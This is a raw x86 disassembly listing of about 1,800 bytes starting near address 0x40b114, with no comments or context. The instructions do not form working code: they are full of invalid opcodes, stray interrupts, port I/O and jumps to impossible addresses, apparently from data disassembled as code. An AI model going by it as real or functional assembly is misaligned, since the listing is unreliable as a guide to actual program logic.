  40b114:	daa    
  40b115:	jbe    0x40b142
  40b117:	push   esp
  40b118:	jle    0x40b0c7
  40b11a:	and    BYTE PTR [edi+0x775c528b],bh
  40b120:	pop    eax
  40b121:	push   es
  40b122:	jmp    0x65b1:0xf9940040
  40b129:	(bad)
  40b12c:	jmp    0xbd3e99d1
  40b131:	mov    ch,0x4e
  40b133:	mov    ecx,0x40fb14f5
  40b138:	ficomp WORD PTR [eax-0x785e328a]
  40b13e:	xor    DWORD PTR [edx],edx
  40b140:	(bad)  
  40b141:	or     BYTE PTR [edx],bl
  40b143:	pop    ebp
  40b144:	pusha  
  40b145:	mov    edi,0x5dfdcc51
  40b14a:	add    eax,DWORD PTR [eax]
  40b14c:	mov    ch,BYTE PTR [esi+0x7]
  40b14f:	dec    ecx
  40b150:	jmp    0xa35a:0xd3aa0aa3
  40b157:	addr16 jne 0x40b18d
  40b15a:	jge    0x40b129
  40b15c:	jns    0x40b14c
  40b15e:	sub    ecx,DWORD PTR [eax+0xf]
  40b161:	or     BYTE PTR [ebx+esi*8],cl
  40b164:	scas   al,BYTE PTR es:[edi]
  40b165:	addr16 dec ebp
  40b167:	icebp  
  40b168:	dec    esp
  40b169:	push   edx
  40b16a:	icebp  
  40b16b:	pop    ebx
  40b16c:	inc    ecx
  40b16d:	lahf   
  40b16e:	inc    eax
  40b16f:	mov    bh,0x77
  40b171:	mov    dh,0xdc
  40b173:	int3   
  40b174:	mov    ds:0xcb992c0b,al
  40b179:	out    0xb1,al
  40b17b:	loopne 0x40b170
  40b17d:	jecxz  0x40b11b
  40b17f:	xchg   esi,eax
  40b180:	js     0x40b1ac
  40b182:	aad    0xfe
  40b184:	adc    al,0x11
  40b186:	mov    ebx,0x4f1f1a75
  40b18b:	clc    
  40b18c:	sbb    bh,BYTE PTR [edx+0x5fa963be]
  40b192:	fisttp DWORD PTR [ebx+0x7]
  40b195:	dec    edx
  40b196:	addr16 in eax,dx
  40b198:	ds inc ebx
  40b19a:	push   cs
  40b19b:	jmp    0x40b193
  40b19d:	ficomp DWORD PTR [esi+0x7d2c675f]
  40b1a3:	mov    ch,0x2
  40b1a5:	mov    BYTE PTR [edx+ebx*8-0x79a6b665],al
  40b1ac:	popf   
  40b1ad:	or     ch,BYTE PTR [edx]
  40b1af:	test   BYTE PTR [ebp+0x61],0x69
  40b1b3:	xchg   edi,eax
  40b1b4:	aad    0x91
  40b1b6:	cwde   
  40b1b7:	into   
  40b1b8:	jnp    0x40b221
  40b1ba:	aas    
  40b1bb:	push   edx
  40b1bc:	arpl   WORD PTR [eax+0xb],dx
  40b1bf:	cmp    DWORD PTR [ebx-0x3e],0x3b9e7c4b
  40b1c6:	bound  ebx,QWORD PTR [eax-0x1dff0f15]
  40b1cc:	popf   
  40b1cd:	lea    ebx,[edx+0x6ad7bb36]
  40b1d3:	mov    esp,DWORD PTR [ebp-0xe]
  40b1d6:	(bad)  [esi+0x731a06d8]
  40b1dc:	mov    ch,0x6d
  40b1de:	cmp    BYTE PTR [ebx],al
  40b1e0:	inc    edx
  40b1e1:	sbb    ah,BYTE PTR [edi+0x27954f86]
  40b1e7:	push   0x7f95027d
  40b1ec:	fld    QWORD PTR [ecx+0x3b6f25ea]
  40b1f2:	sbb    eax,0xef5c3de
  40b1f7:	rcl    DWORD PTR [esi],0x26
  40b1fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1fb:	(bad)  
  40b1fd:	mov    ecx,0x59db90c8
  40b202:	es mov esp,0x87af9bed
  40b208:	push   0xd20c8797
  40b20d:	push   esp
  40b20e:	in     eax,0xd3
  40b210:	inc    eax
  40b211:	push   esp
  40b212:	and    dh,ah
  40b214:	push   ebx
  40b215:	out    0x84,eax
  40b217:	pop    ds
  40b218:	and    DWORD PTR [ebx+0xd],edx
  40b21b:	sub    BYTE PTR [ecx+0x18ac80c3],bh
  40b221:	xlat   BYTE PTR ds:[ebx]
  40b222:	mov    dl,0xb0
  40b224:	jl     0x40b212
  40b226:	retf   
  40b227:	loope  0x40b285
  40b229:	iret   
  40b22a:	and    DWORD PTR [ebp-0x14],ebp
  40b22d:	xor    eax,0xb1763b6b
  40b232:	inc    esp
  40b233:	fld    TBYTE PTR [edi]
  40b235:	icebp  
  40b236:	mov    al,ds:0xbeb1b620
  40b23b:	mov    esp,0xe8c3bd5
  40b240:	aaa    
  40b241:	test   al,0xc6
  40b243:	jg     0x40b23e
  40b245:	mov    bl,0x56
  40b247:	jl     0x40b2bc
  40b249:	pop    ss
  40b24a:	pop    es
  40b24b:	push   cs
  40b24c:	loope  0x40b204
  40b24e:	jl     0x40b1f7
  40b250:	out    0x9b,al
  40b252:	icebp  
  40b253:	mov    eax,ds:0x9f51209c
  40b258:	cmp    edx,esp
  40b25a:	mov    dl,0xbf
  40b25c:	inc    esi
  40b25d:	sub    edi,DWORD PTR [ecx-0x62]
  40b260:	stc    
  40b261:	bound  ecx,QWORD PTR [ecx+0x4ff05414]
  40b267:	js     0x40b1fb
  40b269:	pop    esi
  40b26a:	aas    
  40b26b:	mov    ch,0xfc
  40b26d:	and    eax,0x79db672
  40b272:	mov    dl,0x8
  40b274:	enter  0xba2b,0xdc
  40b278:	jno    0x40b223
  40b27a:	bound  edx,QWORD PTR [esi+0x4d]
  40b27d:	or     BYTE PTR [ecx+eax*1+0x3832092e],0x43
  40b285:	pop    esi
  40b286:	lods   eax,DWORD PTR ds:[esi]
  40b287:	push   eax
  40b288:	out    0xf1,al
  40b28a:	out    0xa9,al
  40b28c:	xchg   ecx,eax
  40b28d:	mov    dl,0xe3
  40b28f:	mov    al,ds:0x8c89bce5
  40b294:	lods   eax,DWORD PTR ds:[esi]
  40b295:	push   edx
  40b296:	xchg   edx,eax
  40b297:	dec    ebp
  40b298:	outs   dx,BYTE PTR ds:[esi]
  40b299:	mov    bh,0x77
  40b29b:	sti    
  40b29c:	ins    BYTE PTR es:[edi],dx
  40b29d:	push   cs
  40b29e:	cmp    BYTE PTR ds:0x50aa7551,bl
  40b2a4:	fstp   DWORD PTR [edi-0x3a]
  40b2a7:	(bad)  
  40b2a8:	fild   QWORD PTR [eax+0x21d58e59]
  40b2ae:	in     al,dx
  40b2af:	rol    DWORD PTR [ecx-0x1cca3405],0x3b
  40b2b6:	mov    ch,0x3d
  40b2b8:	sbb    edx,DWORD PTR [ecx-0x75]
  40b2bb:	lods   al,BYTE PTR ds:[esi]
  40b2bc:	xor    ecx,DWORD PTR [ecx]
  40b2be:	inc    edi
  40b2bf:	push   edi
  40b2c0:	sbb    dl,dh
  40b2c2:	or     BYTE PTR [ebx],dh
  40b2c4:	push   ebx
  40b2c5:	jmp    0x9013182
  40b2ca:	xchg   edi,esp
  40b2cc:	test   DWORD PTR [ecx-0x22],0xb7a59400
  40b2d3:	jge    0x40b2c1
  40b2d5:	leave  
  40b2d6:	pop    ss
  40b2d7:	and    ebp,DWORD PTR [ebx]
  40b2d9:	jmp    0x87f41241
  40b2de:	je     0x40b278
  40b2e0:	jb     0x40b2a3
  40b2e2:	popa   
  40b2e3:	xor    BYTE PTR [edx-0x7d19b0cb],0x3f
  40b2ea:	test   eax,0x4303dd47
  40b2ef:	daa    
  40b2f0:	pop    ss
  40b2f1:	inc    ecx
  40b2f2:	lods   al,BYTE PTR ds:[esi]
  40b2f3:	test   BYTE PTR [eax+0x7e],ah
  40b2f6:	ret    
  40b2f7:	ror    dl,0xff
  40b2fa:	(bad)  
  40b2fb:	lock sbb eax,DWORD PTR ds:0x448ba781
  40b302:	(bad)  
  40b303:	cld    
  40b304:	stos   DWORD PTR es:[edi],eax
  40b305:	mov    bh,0xf1
  40b307:	outs   dx,BYTE PTR ds:[esi]
  40b308:	or     BYTE PTR [ebx],0x55
  40b30b:	cmp    BYTE PTR [edi+eiz*8],0xd9
  40b30f:	xchg   ebx,eax
  40b310:	loope  0x40b30d
  40b312:	dec    esi
  40b313:	cwde   
  40b314:	inc    ebx
  40b315:	fnclex 
  40b317:	lea    ebx,[ebp+eax*1-0x789be5f9]
  40b31e:	cs or  edi,edx
  40b321:	push   ss
  40b322:	in     eax,0x5d
  40b324:	xor    eax,0x8db65636
  40b329:	adc    al,BYTE PTR ds:0x9e216adc
  40b32f:	nop
  40b330:	pop    ebp
  40b331:	jns    0x40b383
  40b333:	cdq    
  40b334:	jecxz  0x40b307
  40b336:	sbb    BYTE PTR [edi],bh
  40b338:	int    0x6a
  40b33a:	push   cs
  40b33b:	xor    BYTE PTR [esi+0x2fefe307],al
  40b341:	mov    bh,0x6a
  40b343:	ins    BYTE PTR es:[edi],dx
  40b344:	pop    ecx
  40b345:	sbb    al,BYTE PTR [eax-0x1d017cf7]
  40b34b:	fdiv   DWORD PTR [ebp-0x3c]
  40b34e:	pop    edi
  40b34f:	ret    
  40b350:	cmp    ah,BYTE PTR [edi-0x74284cf8]
  40b356:	inc    ebx
  40b357:	jns    0x40b2e5
  40b359:	fcomp  QWORD PTR [ebp-0x741fbb53]
  40b35f:	repnz cmp eax,0xc61a5a70
  40b365:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b366:	mov    ds:0xe0dc4635,eax
  40b36b:	jbe    0x40b3ab
  40b36d:	jae    0x40b2f9
  40b36f:	pop    eax
  40b370:	(bad)  
  40b371:	bnd jnp 0x40b2fa
  40b374:	inc    esp
  40b375:	scas   al,BYTE PTR es:[edi]
  40b376:	mov    ebx,0x31795ff6
  40b37b:	jne    0x40b348
  40b37d:	div    BYTE PTR [edx-0x32]
  40b380:	jl     0x40b38d
  40b382:	pop    eax
  40b383:	mov    ds:0x6acc88a0,al
  40b388:	retf   
  40b389:	mov    bh,0x10
  40b38b:	xor    eax,0xc0d5e6d0
  40b390:	inc    ecx
  40b391:	pop    eax
  40b392:	iret   
  40b393:	adc    al,0x18
  40b395:	or     DWORD PTR [edx+ebp*4+0x56],eax
  40b399:	inc    ebp
  40b39a:	mov    ds:0x5845a26,al
  40b39f:	push   esi
  40b3a0:	(bad)  
  40b3a1:	adc    BYTE PTR [edi-0x48],ch
  40b3a4:	jp     0x40b354
  40b3a6:	and    BYTE PTR [esi+0x70],dl
  40b3a9:	int    0xa3
  40b3ab:	xor    al,BYTE PTR [ebx+0x3695a08e]
  40b3b1:	pop    ss
  40b3b2:	inc    ebp
  40b3b3:	adc    eax,0x201fd394
  40b3b8:	dec    edi
  40b3b9:	les    eax,FWORD PTR [edi]
  40b3bb:	push   ebx
  40b3bc:	inc    edx
  40b3bd:	add    eax,0xe03daebc
  40b3c2:	fcomp  DWORD PTR [ebp+0x7eaf68ea]
  40b3c8:	test   DWORD PTR [esi+0x4c6f35e5],ecx
  40b3ce:	shr    cl,1
  40b3d0:	dec    ebp
  40b3d1:	data16 cmp bl,BYTE PTR ds:0x381b0109
  40b3d8:	loope  0x40b3bd
  40b3da:	iret   
  40b3db:	fidiv  WORD PTR ds:0xe313f8fc
  40b3e1:	inc    eax
  40b3e2:	push   ecx
  40b3e3:	icebp  
  40b3e4:	dec    ebp
  40b3e5:	sbb    edi,DWORD PTR [esp+esi*2+0x557d8b4d]
  40b3ec:	(bad)  
  40b3ed:	or     al,0x52
  40b3ef:	dec    ebx
  40b3f0:	adc    al,0xc3
  40b3f2:	fs in  eax,0x63
  40b3f5:	sar    DWORD PTR [esi],0xb9
  40b3f8:	adc    eax,DWORD PTR [esi]
  40b3fa:	xchg   esp,eax
  40b3fb:	sub    bh,BYTE PTR [eax+0x589474d8]
  40b401:	into   
  40b402:	jbe    0x40b446
  40b404:	dec    edi
  40b405:	pop    ebx
  40b406:	cwde   
  40b407:	cmp    dl,BYTE PTR [edi+0x24]
  40b40a:	mov    eax,ds:0xb4a7505c
  40b40f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b410:	pop    ecx
  40b411:	push   eax
  40b412:	ret    
  40b413:	sbb    eax,0x4cf0ade5
  40b418:	push   cs
  40b419:	out    dx,al
  40b41a:	mov    ah,0xa8
  40b41c:	mov    edx,0xc37ebe7f
  40b421:	xor    BYTE PTR [ebp+0x24],0x70
  40b425:	sti    
  40b426:	lock xchg ebx,esi
  40b429:	outs   dx,DWORD PTR ds:[esi]
  40b42a:	jb     0x40b41a
  40b42c:	out    dx,eax
  40b42d:	sbb    esp,DWORD PTR [eax-0x7]
  40b430:	jae    0x40b42e
  40b432:	call   0x60229e4d
  40b437:	sar    cl,0x7c
  40b43a:	sahf   
  40b43b:	sub    BYTE PTR [edx],0xb9
  40b43e:	fbld   TBYTE PTR [eax+0x51]
  40b441:	cs jl  0x40b400
  40b444:	cwde   
  40b445:	jae    0x40b3ea
  40b447:	repnz inc esi
  40b449:	mov    esi,DWORD PTR [edx-0x66]
  40b44c:	cmp    eax,0xba9853f1
  40b451:	test   eax,0x58c053cf
  40b456:	enter  0xe6d5,0xf2
  40b45a:	cmp    al,0x90
  40b45c:	shl    DWORD PTR [edx],cl
  40b45e:	add    eax,0x34e65bb0
  40b463:	push   ss
  40b464:	pop    ebx
  40b465:	xchg   edi,eax
  40b466:	pop    es
  40b467:	fsub   QWORD PTR [esi+edx*2+0x7d]
  40b46b:	fnstcw WORD PTR gs:[ebx+edi*8-0x3e]
  40b470:	add    ah,cl
  40b472:	icebp  
  40b473:	dec    ebx
  40b474:	add    al,0x53
  40b476:	xchg   ecx,eax
  40b477:	pop    esp
  40b478:	fcos   
  40b47a:	xor    ch,dl
  40b47c:	dec    esp
  40b47d:	cmp    DWORD PTR [ebx],0xcc06340a
  40b483:	and    ebp,edx
  40b485:	mov    al,ds:0x850bc2ef
  40b48a:	adc    dh,BYTE PTR [ebx+0x31]
  40b48d:	xchg   DWORD PTR [esi-0x5613d62],edx
  40b493:	cdq    
  40b494:	clc    
  40b495:	sub    esi,ebx
  40b497:	xor    ecx,esi
  40b499:	or     al,0xb4
  40b49b:	xchg   edx,eax
  40b49c:	ret    
  40b49d:	and    ebp,ebx
  40b49f:	daa    
  40b4a0:	cli    
  40b4a1:	jmp    ecx
  40b4a3:	out    0x85,eax
  40b4a5:	push   ds
  40b4a6:	sub    al,0x54
  40b4a8:	jmp    0x40b4a8
  40b4aa:	lahf   
  40b4ab:	and    al,0xa8
  40b4ad:	mov    bh,BYTE PTR [eax+0x7c]
  40b4b0:	int    0x2b
  40b4b2:	dec    ebp
  40b4b3:	add    esi,eax
  40b4b5:	and    BYTE PTR [eax+0x67aa08c1],bl
  40b4bb:	cli    
  40b4bc:	push   ds
  40b4bd:	inc    eax
  40b4be:	and    bl,dh
  40b4c0:	and    eax,0x7a89f4cd
  40b4c5:	cmp    DWORD PTR [eax],0x4cd24f5c
  40b4cb:	sbb    BYTE PTR [edi+esi*1],ch
  40b4ce:	cld    
  40b4cf:	mov    edx,esi
  40b4d1:	lahf   
  40b4d2:	jo     0x40b4a9
  40b4d4:	pop    edi
  40b4d5:	and    bl,0xf2
  40b4d8:	aam    0x9e
  40b4da:	pop    esp
  40b4db:	add    BYTE PTR [ecx-0x78],dh
  40b4de:	sbb    ah,0x83
  40b4e1:	and    al,0x72
  40b4e3:	bound  esi,QWORD PTR [esi]
  40b4e5:	push   cs
  40b4e6:	push   edi
  40b4e7:	xchg   ecx,eax
  40b4e8:	mov    esi,0x8fbc0731
  40b4ed:	xchg   ecx,eax
  40b4ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b4ef:	in     al,dx
  40b4f0:	(bad)  
  40b4f1:	dec    esp
  40b4f2:	pop    esp
  40b4f3:	sbb    al,0xc9
  40b4f5:	add    eax,DWORD PTR [ebp+0x78]
  40b4f8:	icebp  
  40b4f9:	jnp    0x40b54d
  40b4fb:	rol    BYTE PTR [eax+0x2c],1
  40b4fe:	iret   
  40b4ff:	outs   dx,DWORD PTR ds:[esi]
  40b500:	test   DWORD PTR [esi+0x7a5ba7ea],esi
  40b506:	mov    ah,0x3e
  40b508:	lds    esi,FWORD PTR [edx+0x589c7b68]
  40b50e:	sub    DWORD PTR [ebp+0x4e],ecx
  40b511:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b512:	mov    ds:0x6395c1bd,al
  40b517:	fcomip st,st(7)
  40b519:	jl     0x40b54e
  40b51b:	int    0x1e
  40b51d:	in     al,0xd7
  40b51f:	ret    
  40b520:	(bad)  
  40b521:	loopne 0x40b52f
  40b523:	mov    cs:0x2a860ece,al
  40b529:	xor    esp,DWORD PTR [eax-0x7b8870b8]
  40b52f:	cmp    DWORD PTR [esi-0x4b],edx
  40b532:	popa   
  40b533:	stc    
  40b534:	ror    BYTE PTR [edi+0x40],0x11
  40b538:	gs and ecx,ecx
  40b53b:	loopne 0x40b5aa
  40b53d:	(bad)  
  40b53e:	mov    al,ds:0xb927836c
  40b543:	ins    BYTE PTR es:[edi],dx
  40b544:	into   
  40b545:	popf   
  40b546:	push   eax
  40b547:	lock shl ebx,0x9d
  40b54b:	(bad)  
  40b54c:	stos   DWORD PTR es:[edi],eax
  40b54d:	retf   0x804
  40b550:	aaa    
  40b551:	add    ecx,0x1
  40b554:	sbb    ch,BYTE PTR [esp+ebp*1]
  40b557:	pop    esi
  40b558:	or     edi,DWORD PTR [esi-0x57]
  40b55b:	inc    edx
  40b55c:	mov    al,ds:0x8a41d28b
  40b561:	out    dx,eax
  40b562:	push   esp
  40b563:	add    eax,0xd002a445
  40b568:	cmp    DWORD PTR [edx],edi
  40b56a:	scas   eax,DWORD PTR es:[edi]
  40b56b:	in     eax,dx
  40b56c:	das    
  40b56d:	mov    DWORD PTR [ebx+0x2c],ebx
  40b570:	push   cs
  40b571:	pop    esi
  40b572:	das    
  40b573:	loope  0x40b504
  40b575:	mov    al,ds:0x1f6a41a7
  40b57a:	bound  eax,QWORD PTR [edi-0x3]
  40b57d:	pop    ss
  40b57e:	cmp    ebx,DWORD PTR [edi]
  40b580:	mov    dl,0x3c
  40b582:	cmc    
  40b583:	cmp    esi,DWORD PTR [eax-0x3b71ed61]
  40b589:	cld    
  40b58a:	add    edi,ecx
  40b58c:	bound  ebp,QWORD PTR [edi-0x2f29fd85]
  40b592:	in     eax,0x27
  40b594:	sbb    BYTE PTR [ebx],dl
  40b596:	adc    esp,DWORD PTR [edx]
  40b598:	cmp    BYTE PTR [edx+0x61115f4d],0x4
  40b59f:	dec    ecx
  40b5a0:	or     al,0xe8
  40b5a2:	xchg   ecx,eax
  40b5a3:	ror    cl,0x3e
  40b5a6:	cmp    BYTE PTR [esp+edi*2+0x6b],dh
  40b5aa:	add    edx,DWORD PTR [ecx+0x1f]
  40b5ad:	test   DWORD PTR [edx+0x5093af16],edi
  40b5b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5b4:	mov    ebp,0xb532ebbd
  40b5b9:	pop    eax
  40b5ba:	jo     0x40b57e
  40b5bc:	jle    0x40b592
  40b5be:	stc    
  40b5bf:	pop    ecx
  40b5c0:	sbb    al,0xfb
  40b5c2:	inc    ebp
  40b5c3:	inc    ebx
  40b5c4:	or     al,0x77
  40b5c6:	mov    ds:0x861a2b1b,al
  40b5cb:	aad    0xe7
  40b5cd:	call   0xa6e2:0x15b79507
  40b5d4:	ins    BYTE PTR es:[edi],dx
  40b5d5:	outs   dx,BYTE PTR ds:[esi]
  40b5d6:	sahf   
  40b5d7:	fistp  WORD PTR [ebx]
  40b5d9:	push   ss
  40b5da:	fs loop 0x40b62e
  40b5dd:	popa   
  40b5de:	jle    0x40b5af
  40b5e0:	sbb    BYTE PTR [edx+0x44],0x65
  40b5e4:	adc    eax,0xd1b55927
  40b5e9:	cmc    
  40b5ea:	shl    BYTE PTR [edi+0x3bf64b00],1
  40b5f0:	fwait
  40b5f1:	mov    ah,0xdd
  40b5f3:	stos   BYTE PTR es:[edi],al
  40b5f4:	popf   
  40b5f5:	xchg   esi,eax
  40b5f6:	jo     0x40b5dc
  40b5f8:	sbb    esi,DWORD PTR [edx]
  40b5fa:	mov    ch,0xcf
  40b5fc:	fyl2x  
  40b5fe:	push   eax
  40b5ff:	xchg   edi,eax
  40b600:	cmp    BYTE PTR [ebx-0x6f019c34],bh
  40b606:	jl     0x40b5c5
  40b608:	inc    eax
  40b609:	push   cs
  40b60a:	(bad)  
  40b60b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b60c:	add    DWORD PTR [ebx+0x3b6a3538],esi
  40b612:	push   eax
  40b613:	mov    edi,0x8c2d74ee
  40b618:	mov    esi,0x909b9cf2
  40b61d:	jmp    0xfb08:0x9db1da3e
  40b624:	push   0x60103f58
  40b629:	ret    
  40b62a:	inc    esp
  40b62b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b62c:	adc    esi,DWORD PTR es:[edi+eax*8-0x7fa493c3]
  40b634:	sti    
  40b635:	imul   esp,ebp,0xffffff8f
  40b638:	and    eax,DWORD PTR [ebx]
  40b63a:	aam    0x63
  40b63c:	jb     0x40b678
  40b63e:	push   ecx
  40b63f:	rcr    BYTE PTR es:[esi-0x6370500b],cl
  40b646:	arpl   cx,bp
  40b648:	xchg   esi,eax
  40b649:	xchg   ebx,eax
  40b64a:	arpl   WORD PTR [edx-0x47480080],bp
  40b650:	ss mov esi,0xc2be4c33
  40b656:	scas   eax,DWORD PTR es:[edi]
  40b657:	pop    edx
  40b658:	fsub   DWORD PTR [eax]
  40b65a:	cmp    eax,eax
  40b65c:	popf   
  40b65d:	stos   BYTE PTR es:[edi],al
  40b65e:	ret    0x27c9
  40b661:	push   eax
  40b662:	retf   0x48ec
  40b665:	mov    WORD PTR [esi],es
  40b667:	adc    dh,cl
  40b669:	add    bh,BYTE PTR [eax-0x2b]
  40b66c:	fwait
  40b66d:	add    bl,BYTE PTR [esi]
  40b66f:	sub    DWORD PTR [eax],edx
  40b671:	mov    eax,ds:0xb2e7c2c4
  40b676:	pop    ss
  40b677:	repnz in eax,0x84
  40b67a:	mov    dh,0x7d
  40b67c:	mov    esi,DWORD PTR [ebp+0x77b0758e]
  40b682:	bound  ecx,QWORD PTR [ebx+0x9]
  40b685:	dec    ebx
  40b686:	outs   dx,BYTE PTR ds:[esi]
  40b687:	dec    eax
  40b688:	pop    esp
  40b689:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b68a:	hlt    
  40b68b:	je     0x40b653
  40b68d:	dec    ebp
  40b68e:	jnp    0x40b6ba
  40b690:	xchg   ecx,eax
  40b691:	inc    eax
  40b692:	dec    ecx
  40b693:	fstp   QWORD PTR [eax-0x3c3f467e]
  40b699:	adc    DWORD PTR [ebp+0x4c],edx
  40b69c:	test   DWORD PTR [ebx-0x3496bfb1],edx
  40b6a2:	mov    cl,0xd9
  40b6a4:	cli    
  40b6a5:	sbb    eax,0xe2392766
  40b6aa:	scas   eax,DWORD PTR es:[edi]
  40b6ab:	or     al,0x9b
  40b6ad:	fistp  QWORD PTR [edx+0x60]
  40b6b0:	ret    0xb989
  40b6b3:	cmp    eax,0xad59cf78
  40b6b8:	cmc    
  40b6b9:	pushf  
  40b6ba:	dec    edi
  40b6bb:	jo     0x40b730
  40b6bd:	inc    ebp
  40b6be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6bf:	inc    esp
  40b6c0:	imul   ecx,DWORD PTR [esi+0x8597700],0xffffffed
  40b6c7:	sub    dh,BYTE PTR [eax+edi*8-0x37]
  40b6cb:	push   edi
  40b6cc:	js     0x40b667
  40b6ce:	sub    BYTE PTR [ecx-0x20],ch
  40b6d1:	popf   
  40b6d2:	adc    DWORD PTR [ecx+0x52],esp
  40b6d5:	leave  
  40b6d6:	dec    ebp
  40b6d7:	dec    esi
  40b6d8:	mov    edi,0x6dbc75a
  40b6dd:	ja     0x40b67f
  40b6df:	aaa    
  40b6e0:	dec    ebp
  40b6e1:	push   ecx
  40b6e2:	out    dx,al
  40b6e3:	dec    eax
  40b6e4:	jle    0x40b73c
  40b6e6:	xor    eax,0x7cb2b9e8
  40b6eb:	mov    edi,0x50f11d0e
  40b6f0:	arpl   WORD PTR [esi],si
  40b6f2:	push   eax
  40b6f3:	xor    al,0xae
  40b6f5:	mov    cl,0xb2
  40b6f7:	popa   
  40b6f8:	mov    DWORD PTR [ebp+eiz*1+0xd7671e5],edx
  40b6ff:	jecxz  0x40b6fd
  40b701:	fidiv  WORD PTR [edx]
  40b703:	jg     0x40b703
  40b705:	cdq    
  40b706:	mov    esi,0x703573f9
  40b70b:	pop    edi
  40b70c:	inc    esi
  40b70d:	stos   BYTE PTR es:[edi],al
  40b70e:	mov    cl,0xd9
  40b710:	(bad)  
  40b711:	stos   BYTE PTR es:[edi],al
  40b712:	mov    ch,0xc1
  40b714:	(bad)  
  40b715:	mov    al,0x6c
  40b717:	stc    
  40b718:	test   DWORD PTR [ecx-0x64df8598],0x485f7e4e
  40b722:	in     al,dx
  40b723:	xor    BYTE PTR [eax],al
  40b725:	mov    al,ds:0x7c1de1fc
  40b72a:	dec    esi
  40b72b:	dec    esp
  40b72c:	out    0x44,al
  40b72e:	xor    ebp,esp
  40b730:	test   eax,0xda6d5938
  40b735:	cmp    al,0x15
  40b737:	push   0xffffff8b
  40b739:	and    bh,BYTE PTR [edx+0x6f]
  40b73c:	and    ebp,DWORD PTR [edi-0x1]
  40b73f:	inc    edx
  40b740:	push   ecx
  40b741:	mov    dh,0x5a
  40b743:	mov    esi,DWORD PTR [eax-0x13]
  40b746:	mov    cl,0x3b
  40b748:	push   edx
  40b749:	jno    0x40b7b9
  40b74b:	dec    eax
  40b74c:	dec    eax
  40b74d:	popf   
  40b74e:	cs mov dh,0x78
  40b751:	int3   
  40b752:	xchg   esp,eax
  40b753:	cmp    al,0x42
  40b755:	lea    eax,[ecx+0x56]
  40b758:	out    dx,al
  40b759:	imul   ebp,esi,0x47b50b1e
  40b75f:	mov    ecx,0xcf88fe45
  40b764:	mov    al,cl
  40b766:	cmp    al,0xd8
  40b768:	xchg   ebp,eax
  40b769:	pop    esi
  40b76a:	push   eax
  40b76b:	(bad)  
  40b76d:	sbb    eax,ecx
  40b76f:	arpl   sp,cx
  40b771:	int    0xf
  40b773:	clc    
  40b774:	test   al,0x5a
  40b776:	out    0xf4,eax
  40b778:	loopne 0x40b777
  40b77a:	repz enter 0x9628,0x27
  40b77f:	jne    0x40b772
  40b781:	pusha  
  40b782:	sahf   
  40b783:	lods   al,BYTE PTR ds:[esi]
  40b784:	cmp    DWORD PTR [edi-0x53a626c1],eax
  40b78a:	pop    ds
  40b78b:	ficomp WORD PTR [ebx+0x77323307]
  40b791:	xor    al,0xd9
  40b793:	fstp   QWORD PTR [edi+eax*2+0x2f29549e]
  40b79a:	test   DWORD PTR [edx+0x48],esi
  40b79d:	jmp    DWORD PTR [ecx-0x6e]
  40b7a0:	in     eax,0xe
  40b7a2:	test   eax,0x5f5fde3e
  40b7a7:	push   esp
  40b7a8:	add    eax,eax
  40b7aa:	push   0x66
  40b7ac:	test   DWORD PTR [edi],edx
  40b7ae:	push   esp
  40b7af:	out    dx,al
  40b7b0:	mov    ds:0xbf164fce,al
  40b7b5:	jg     0x40b7d3
  40b7b7:	(bad)  
  40b7b8:	call   0xc54ad948
  40b7bd:	rcr    DWORD PTR ds:0x6696e45a,0x2c
  40b7c4:	fidivr DWORD PTR [ecx-0x56fbc0cd]
  40b7ca:	xchg   edi,eax
  40b7cb:	nop
  40b7cc:	fcomp  DWORD PTR [ecx-0x7b]
  40b7cf:	xor    dl,BYTE PTR [ecx-0x766e2b69]
  40b7d5:	or     ecx,0x3e
  40b7d8:	nop
  40b7d9:	mov    eax,cs
  40b7db:	test   eax,0xb3824501
  40b7e0:	jne    0x40b84f
  40b7e2:	xor    DWORD PTR [esp+ecx*2-0x5],edx
  40b7e6:	in     eax,dx
  40b7e7:	mov    DWORD PTR [ebx],edi
  40b7e9:	jmp    0x7424f05d
  40b7ee:	mov    ecx,0xc1cfc24f
  40b7f3:	outs   dx,BYTE PTR ds:[esi]
  40b7f4:	pop    edi
  40b7f5:	inc    eax
  40b7f6:	pop    ebp
  40b7f7:	inc    edi
  40b7f8:	addr16 in eax,dx
  40b7fa:	out    dx,eax
  40b7fb:	add    dh,dh
  40b7fd:	into   
  40b7fe:	mov    eax,0x31a94a3b
  40b803:	jmp    0xbf80c901
  40b808:	mov    gs:0x2026f9f7,eax
  40b80e:	je     0x40b7a7
  40b810:	dec    edx
  40b811:	mov    bl,0xac
  40b813:	bound  ebx,QWORD PTR [ecx+0x18ea1990]
  40b819:	ret    
  40b81a:	into   
  40b81b:	ret    
  40b81c:	out    dx,al
  40b81d:	(bad)  
  40b81f:	lea    ebp,[esi+ebx*8-0x7f9c5dd2]
  40b826:	inc    esi
  40b827:	sub    eax,ebp
  40b829:	jo     0x40b893
  40b82b:	xchg   ebx,eax
  40b82c:	aad    0xbc
  40b82e:	mov    ebx,DWORD PTR es:[edi]
  40b831:	inc    esp
  40b832:	mov    ah,0x61
  40b834:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b835:	repz xchg ecx,eax
  40b837:	test   eax,0xb96ddeb7
  40b83c:	xor    DWORD PTR [ecx+0x6a12b7b1],0xa9c3a913
  40b846:	jecxz  0x40b81f
  40b848:	pop    esi
  40b849:	sti    
  40b84a:	push   ebx
  40b84b:	loop   0x40b883
  40b84d:	hlt    
  40b84e:	rol    BYTE PTR [eax+0x37],cl
  40b851:	stos   DWORD PTR es:[edi],eax
  40b852:	jb     0x40b81d
  40b854:	sbb    edi,DWORD PTR ds:0xbac2543
  40b85a:	add    DWORD PTR [ecx-0x4c],0xba6c01d2
  40b861:	push   ss
  40b862:	call   0xaf50:0xa6a86625
  40b869:	mov    ebp,0x77dbaa4c
  40b86e:	inc    ebx
  40b86f:	mov    ds:0x7c24f3dc,al
